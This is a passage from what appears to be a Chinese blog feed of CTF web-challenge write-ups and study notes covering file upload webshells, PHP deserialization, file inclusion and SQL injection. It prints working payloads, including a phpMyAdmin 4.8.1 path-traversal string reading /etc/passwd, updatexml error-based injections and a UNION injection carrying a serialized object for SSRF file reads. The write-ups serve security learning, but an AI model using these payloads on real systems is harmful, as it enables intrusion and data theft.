<p>发现这个下面给出了flag文件的名字</p>
<p>读取一下</p>
<p><img src="/2022/01/28/myphpsite/8.png" alt="2"></p>
<p>解码一下</p>
<p><img src="/2022/01/28/myphpsite/6.png" alt="2"></p>
<p>得到flag</p>
<p>KCTF{L0C4L_F1L3_1ncLu710n}</p>
]]></content>
      <tags>
        <tag>knightctf</tag>
      </tags>
  </entry>
  <entry>
    <title>你传你🐎呢</title>
    <url>/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/</url>
    <content><![CDATA[<h1 id="做了一下-MRCTF2020-你传你🐎呢"><a href="#做了一下-MRCTF2020-你传你🐎呢" class="headerlink" title="做了一下[MRCTF2020]你传你🐎呢"></a>做了一下[MRCTF2020]你传你🐎呢</h1><p>进去是这样<img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/1.png" alt="1"></p>
<p>发现是一个文件上传漏洞</p>
<p>先上传任意文件试试</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/2.png" alt="2"></p>
<p>发现有问题</p>
<p>测试一下发现只有png格式可以上传</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/3.png" alt="3"></p>
<p>尝试抓包把Content-Type改成image/png将getshell代码变成图片上传</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/4.png" alt="4"></p>
<p>这时候我们可以通过上传htaccess文件将图片变成可执行的代码（我前面的文件上传中有写）</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/5.png" alt="5"></p>
<p>然后用蚂剑链接</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/6.png" alt="6"></p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/7.png" alt="7"></p>
<p>文件无法用cat直接获取翻看一下目录</p>
<p>发现flag在根目录下读取</p>
<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/8.png" alt="8"></p>
<p>flag{bfed417c-0c19-4b10-9e6f-4bcc4c1d60de}</p>
]]></content>
      <tags>
        <tag>MRCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>序列化</title>
    <url>/2022/01/27/%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="序列化反序列化"><a href="#序列化反序列化" class="headerlink" title="序列化反序列化"></a>序列化反序列化</h1><p>反序列化漏洞专题</p>
<p>代码审计重点：</p>
<p>1、在源代码审计的时候要确认代码逻辑安全性</p>
<p>2、在做在吗审计的时候要确认调用函数的安全性</p>
<h5 id="PASS-1"><a href="#PASS-1" class="headerlink" title="PASS-1"></a>PASS-1</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;Micheal&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> seralize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;demoTest&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Micheal&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;man&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">31</span>;&#125;</span><br><span class="line">O表示一个类</span><br><span class="line">字符类型：名称个数：“名称”;(：如果是类这便是key/value的个数：)</span><br><span class="line">    key：value一组</span><br></pre></td></tr></table></figure>



<p>如果有类的反序列化题目就会先走（自动触发）__destruct（）这个魔法函数</p>
<p>如果OP===2</p>
<p>则把op复制成‘1’</p>
<p>然后把conent的值赋空字符串</p>
<p>然后调用process（）方法函数<img src="/2022/01/27/%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt="1"></p>
<p>如果op==1则调用write方法</p>
<p>如果op==2则调用read（）返回一个res并且输出</p>
<p>如果都不满足则输出 bad hacker！</p>
<p>如果要读取flag肯定调用read（）方法</p>
<p><img src="/2022/01/27/%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt="2"></p>
<p>直接序列化控制其中的变量</p>
<h2 id="漏洞本质："><a href="#漏洞本质：" class="headerlink" title="漏洞本质："></a>漏洞本质：</h2><p>unserialize函数的变量可控</p>
<p>php文件重存在可利用类，类中有魔术方法</p>
<h3 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h3><p>__construct(), __destruct()</p>
<p>__call(),\ __callStatic()</p>
<p>__get(), __set()</p>
<p>__isset(),__unset()</p>
<p>__sleep(), __wakeup()</p>
<p>__toString()</p>
<p>__invoke()</p>
<p>__set_state()</p>
<p>__clone()</p>
<p>__debugInfo()</p>
]]></content>
  </entry>
  <entry>
    <title>我有一个数据库</title>
    <url>/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>首先进去是遗传乱码</p>
<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" alt="1"></p>
<p>应该是编码问题</p>
<p>看了一下robots.txt</p>
<p>里面藏了一个东西</p>
<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" alt="1"></p>
<p>但是里面好像啥也没有</p>
<p>还是扫描一下把</p>
<p>可以看到里面有一个phpmyadmin页面</p>
<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" alt="1"></p>
<p>这里右边直接就给数据库版本服务器版本以及phpadmin版本</p>
<p>找了半天数据库5.5.62也没啥漏洞，最后看了一下phpmyadmin4.8.1有漏洞</p>
<p>去网上直接用就行了</p>
<p>简单来说就是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">一个文件包含漏洞</span><br><span class="line">他必须传入target参数</span><br><span class="line">在后面添加?进行截断</span><br><span class="line">’$target=db_sql.php?/../../被包含文件’</span><br><span class="line">就可以读取到文件</span><br><span class="line">但是windows文件不能用特殊字符可以经过两次编码</span><br><span class="line">这样在最后一个判断的时候就可以判断为db_sql.php符合条件就可以文件包含</span><br></pre></td></tr></table></figure>

<p>直接用他们的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../../../etc/passwd </span><br><span class="line">他会包含这个文件，其中target值会被解析成db_sql.php%3f/../../test.txt，因为php会把前面db_sql.php%3f当成目录</span><br><span class="line">所以要多加一个../来跳出此目录，执行后面语句。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" alt="1"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../../../flag </span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/10/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" alt="1"></p>
<p>拿到flag</p>
]]></content>
      <tags>
        <tag>GWCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>%00截断</p>
<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>%00阻断</p>
<p>php://filter/read=convert.base64-encode/resource=</p>
<h3 id="文件包含-挖掘经验"><a href="#文件包含-挖掘经验" class="headerlink" title="文件包含-挖掘经验"></a>文件包含-挖掘经验</h3><p>• 模块加载、cache调用，传入的参数拼接包含路径</p>
<p>• include()</p>
<p>使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p>
<p>• inclue_once()</p>
<p>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
<p>• require()</p>
<p>使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并</p>
<p>立即终止程序。</p>
<p>• require_once()</p>
<p>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
<p>了解常见的文件包含点</p>
<p>会基本利用文件包含点，包括伪协议等</p>
<p>查看服务器 apche或者nginx（/var/log/nginx/access.log）</p>
<p>找到它默认的服务器日志存放位置</p>
<p>读文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png" alt="1"></p>
<p>被包含的文件如果含有&lt;?php &lt;? 等php投，里面的php代码就会被执行</p>
<p>require或者include</p>
<p>常见可在服务器上生成文件的功能</p>
<p>1、文件上传</p>
<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png" alt="2"></p>
<p>file=***则存在文件包含漏洞</p>
<p>2、服务器日志目录一般在（/var/log/apache2/assess.logAPACHE协议）<em><strong>用post请求发送，来源用referer</strong></em></p>
<p>3、程序本身自带备份功能（MyWebSQL）</p>
<p>php://filter=伪协议</p>
<p>/?file=php://filter/read=convert.base64-encode/resource=xxx.php</p>
<h2 id="文件读取-挖掘经验"><a href="#文件读取-挖掘经验" class="headerlink" title="文件读取-挖掘经验"></a>文件读取-挖掘经验</h2><h4 id="load-file-函数"><a href="#load-file-函数" class="headerlink" title="load_file()函数"></a>load_file()函数</h4><p>1、必须有权限读取并且文件必须完全刻度</p>
<p>2、想要读取的文件必须再服务器上</p>
<p>3、必须指定文件完整的路劲</p>
<p>4、想要读文件必须小于max_allowed_packet</p>
<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png" alt="3"></p>
<p>• fopen()</p>
<p>• file_get_contents()</p>
<p>• fread</p>
<p>• fgets</p>
<p>• fgetss</p>
<p>• file</p>
<p>• fpassthru</p>
<p>• parse_ini_file</p>
<p>• readfile</p>
<p> allow_url_fopen选项激活了 URL 形式的 fopen 封装协议</p>
<p>使得可以访问 URL 对象例如文件。默认的封装协议提供用</p>
<p>ftp 和 http 协议来访问远程文件，一些扩展库例如 zlib 可</p>
<p>能会注册更多的封装协议</p>
<h2 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h2><p>unlink（）</p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png" alt="4"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> extract ( <span class="variable">$array</span> , extract_rules,prefix ) </span><br><span class="line">    </span><br><span class="line">•<span class="variable">$array</span> 关联的数组，受第二个和第三个参数的影响。 </span><br><span class="line">•extract_rules 对待非法／数字和冲突的键名的方法将根据取出标记</span><br><span class="line">•prefix 仅在第二个参数特殊时需要，添加前缀</span><br><span class="line"><span class="comment"># extract（）变量覆盖</span></span><br></pre></td></tr></table></figure>

<h4 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="**parse_str()**变量覆盖"></a>**parse_str()**变量覆盖</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> parse_str ( <span class="keyword">string</span> <span class="variable">$encoded_string</span> [, <span class="keyword">array</span> &amp;<span class="variable">$result</span> ] )</span><br><span class="line"><span class="comment"># $encoded_string 输入的字符串</span></span><br><span class="line"><span class="comment"># $result 变量将会以数组元素的形式存入到这个数组，作为替代</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">import_request_variables()</span><br><span class="line">    (PHP <span class="number">4</span> &gt;= <span class="number">4.1</span>.<span class="number">0</span>, PHP <span class="number">5</span> &lt; <span class="number">5.4</span>.<span class="number">0</span>)</span><br><span class="line">import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中</span><br><span class="line"><span class="keyword">bool</span> import_request_variables ( <span class="keyword">string</span> <span class="variable">$types</span> [, <span class="keyword">string</span> <span class="variable">$prefix</span> ] )</span><br><span class="line"><span class="comment"># $type 指定需要导入的变量。可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie</span></span><br><span class="line"><span class="comment"># $prefix 变量名前缀</span></span><br></pre></td></tr></table></figure>



<h3 id="危险函数："><a href="#危险函数：" class="headerlink" title="危险函数："></a>危险函数：</h3><p>•<strong>EXTR_OVERWRITE</strong> - 默认。如果有冲突，则覆盖已有的变量。</p>
<p>•EXTR_SKIP - 如果有冲突，不覆盖已有的变量。（忽略数组中同名的元素）</p>
<p><strong>•EXTR_PREFIX_SAME</strong> - 如果有冲突，在变量名前加上前缀 prefix。自 PHP 4.0.5 起，这也包括了对数字</p>
<p>索引的处理</p>
<p>•EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix（第三个参数）</p>
<p>•EXTR_PREFIX_INVALID - 仅在非法或数字变量名前加上前缀 prefix。本标记是 PHP 4.0.5 新加的。</p>
<p>•<strong>EXTR_IF_EXISTS</strong> - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。可以用在已经</p>
<p>定义了一组合法的变量，然后要从一个数组例如 $_REQUEST 中提取值覆盖这些变量的场合。本标记是 PH</p>
<p>P 4.2.0 新加的。</p>
<p>•EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不</p>
<p>处理。本标记是 PHP 4.2.0 新加的。</p>
<p>•EXTR_REFS - 将变量作为引用提取。这有力地表明了导入的变量仍然引用了 var_array 参数的值。可以</p>
<p>单独使用这个标志或者在 extract_type 中用 OR 与其它任何标志结合使用。本标记是 PHP 4.3.0 新加</p>
<p>的。</p>
]]></content>
  </entry>
  <entry>
    <title>极客大挑战HardSQL</title>
    <url>/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/</url>
    <content><![CDATA[<h1 id="极客大挑战Hardsql"><a href="#极客大挑战Hardsql" class="headerlink" title="极客大挑战Hardsql"></a>极客大挑战Hardsql</h1><p>// 题目是一个很容易的报错题目</p>
<p>首先判断出错点：</p>
<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/1.png" alt="1"></p>
<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/2.png" alt="2"></p>
<p>尝试得出是字符串注入单引号闭合</p>
<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/3.png" alt="3"></p>
<p>经过尝试判断出此题过滤空格等于号等字符</p>
<p>我们可以用括号进行绕过</p>
<p>因为无法回显所以想到报错注入</p>
<p>此题可以用的是xpath注入</p>
<p>也就是updatexml以及extractvalue()注入</p>
<p>用updatexml为例：</p>
<p>构造payload</p>
<p>因为用or不好连接而此题没有屏蔽符号所以用^来代替or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">password=admin&#x27;^updatexml(1,concat(0x7e,database()),1)%23				// 0x7e是~ %23是url编码的#</span><br></pre></td></tr></table></figure>



<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/4.png" alt="4"></p>
<p>得知库为geek</p>
<p>接下来就爆表爆字段</p>
<p>表payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin&#x27;^updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))),1)%23</span><br><span class="line">因为此题过滤了=所以用like进行绕过作用相同</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/5.png" alt="5"></p>
<p>字段payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin&#x27;^updatexml(1,concat(0x7e,(select(column_name)from(information_schema.columns)where(table_name)like(&#x27;geek&#x27;))),1)%23</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/6.png" alt="6"></p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=admin&#x27;^updatexml(1,concat(0x7e,(select(password)from(H4rDsq1))),1)%23</span><br></pre></td></tr></table></figure>

<p>注意：xpath函数报错只会回显32个字符</p>
<p>最后进行拼接得出flag</p>
<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/7.png" alt="7">flag{fd706149-94a1-449c-b1ee-68f4af78dd5d}</p>
]]></content>
      <tags>
        <tag>极客大挑战</tag>
      </tags>
  </entry>
  <entry>
    <title>王鼎杯2020青龙组AreUSerialz</title>
    <url>/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/</url>
    <content><![CDATA[<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>同样先进去看看发现是一道序列化题目</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/1.png" alt="1"></p>
<p>然后进行代码审计</p>
<p>注意：这类型题目在进行反序列化时首先调用的是__destruct()魔术方法</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/2.png" alt="2"></p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/5.png" alt="5"></p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/4.png" alt="4"></p>
<p>我们可以看到这里上面的2是强比较类型（同类型同大小同数值）而下面是弱比较类型不一定需要类型相同所以要绕过这个if我们可以直接用int类型2</p>
<p>可以看到我们可以进行文件读取filename就是我们需要读取的文件路径</p>
<p>我们可以通过php伪协议进行读取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>所以我们需要改的参数只有op以及filename</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">``protected` `$op``=2;</span><br><span class="line">``protected` `$filename``=``&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;``;</span><br><span class="line">``protected` `$content``;</span><br></pre></td></tr></table></figure>

<p>我们直接进行序列化</p>
<p>注意class类型序列化时需要先实例化对象</p>
<p>最后都得到</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/8.png" alt="8"></p>
<p>发现有三个显示不正确的地方</p>
<p>上网查了一下发现是%00的编码无法通过上面的is_valid函数校验（参考文档：<a class="link" href="https://www.cnblogs.com/Cl0ud/p/12874458.html%EF%BC%89">https://www.cnblogs.com/Cl0ud/p/12874458.html）<i class="fas fa-external-link-alt"></i></a></p>
<p>最简单的解决办法是将上面类中的对象转换成public类型（因为php7+版本对属性不敏感）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">public` `$op``=2;</span><br><span class="line">public` `$filename``=``&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;``;</span><br><span class="line">public` `$content``;</span><br></pre></td></tr></table></figure>

<p>最后得到</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/7.png" alt="7"></p>
<p>最后用get方式传进str</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/9.png" alt="9"></p>
<p>最后进行base64解码就行了</p>
<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/11.png" alt="11"></p>
<p>flag{242b88d2-1121-4c83-a6e4-7685dc25adfb}</p>
]]></content>
      <tags>
        <tag>网鼎杯</tag>
      </tags>
  </entry>
  <entry>
    <title>fakebook</title>
    <url>/2022/01/31/fakebook/</url>
    <content><![CDATA[<h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h1><p>今天的第二条</p>
<p>先看看题目</p>
<p><img src="/2022/01/31/fakebook/1.png" alt="1"></p>
<p>页面上有些登录信息以及两个网页</p>
<p>join创建账户</p>
<p><img src="/2022/01/31/fakebook/2.png" alt="1"></p>
<p><img src="/2022/01/31/fakebook/7.png" alt="1"></p>
<p>login登录</p>
<p>登上去试试</p>
<p><img src="/2022/01/31/fakebook/6.png" alt="1"></p>
<p>可以看到这里面注入都没啥用</p>
<p>用户名可以点击</p>
<p>进去看看</p>
<p><img src="/2022/01/31/fakebook/8.png" alt="1"></p>
<p>可以看到以get方式传入了一个no</p>
<p>测试一下sql注入</p>
<p>发现屏蔽了空格可以用/**/绕过</p>
<p>看一下列数</p>
<p><img src="/2022/01/31/fakebook/3.png" alt="1"></p>
<p>看到有4列而且2在页面上回显了</p>
<p>看到有sql注入漏洞</p>
<p>进行注入</p>
<p><img src="/2022/01/31/fakebook/4.png" alt="1"></p>
<p><img src="/2022/01/31/fakebook/5.png" alt="1"></p>
<p>可以看到库表列，下面写一下我拿到的结果</p>
<p>fakebook,information_schema,mysql,performance_schema,test    库</p>
<p>fakebook里面含有users里面是我们注册时账号密码</p>
<p>但是可以看到</p>
<p><img src="/2022/01/31/fakebook/11.png" alt="1"></p>
<p>可以看到里面时我们的账号密码以及data</p>
<p>我们的密码时按照序列化显示的</p>
<p>到这里卡住了</p>
<p>想想别的办法</p>
<p>查看一下robots.txt看看网页有没有设置机器人</p>
<p><img src="/2022/01/31/fakebook/9.png" alt="1"></p>
<p>一看还真有</p>
<p>里面给出了提示有一个uesr.php的备份文件</p>
<p>我们输入这个网址可以下载到这个文件的源代码</p>
<p>看一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到我们传入了三个参数，name，age以及blog而blog会读取我们输入的地址</p>
<p>他的主要工作是建立会话判断一下是不是有效请求，不是就返回404，curl_exec这里是可能存在ssrf漏洞的</p>
<p>可以用ssrf来伪文件读取</p>
<p>可是我们怎么知道flag的文件地址呢</p>
<p>试一下御剑</p>
<p>可以看到flag.php就在文件当中，而之前的报错中可以看到大部分的网页全部都是存储再/var/www/html/中的</p>
<p>我们可以来读一度这里的文件</p>
<p>之前看到我们在之前注入的第四位是data，这个里面包含了博客的网址，如果其中有数就会读取出来</p>
<p>而他又是序列化之后的结果，我们可以更改里面的数据让他读取的文件变成flag.php</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:21:&quot;paixiaoxing.github.io“;&#125;</span><br></pre></td></tr></table></figure>

<p>改成：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>就可以再回显的页面直接读取到flag.php里面的代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload=?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>在源代码里面发现了base64加密过的flag</p>
<p>拿到解密文件里面解密一下就可以拿到flag了</p>
<p>后来我回头又看了一下，知道了flag的路径，我们是不是也可以用load_file()这个函数直接读取flag里面的值呢</p>
<p>看一下权限</p>
<p><img src="/2022/01/31/fakebook/12.png" alt="1"></p>
<p>发现居然是root权限那么应该可行</p>
<p><img src="/2022/01/31/fakebook/13.png" alt="1"></p>
<p>发现这样也可以拿到flag</p>
<p>之前的需要base64解码一下</p>
]]></content>
  </entry>
  <entry>
    <title>禁止套娃</title>
    <url>/2022/02/10/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
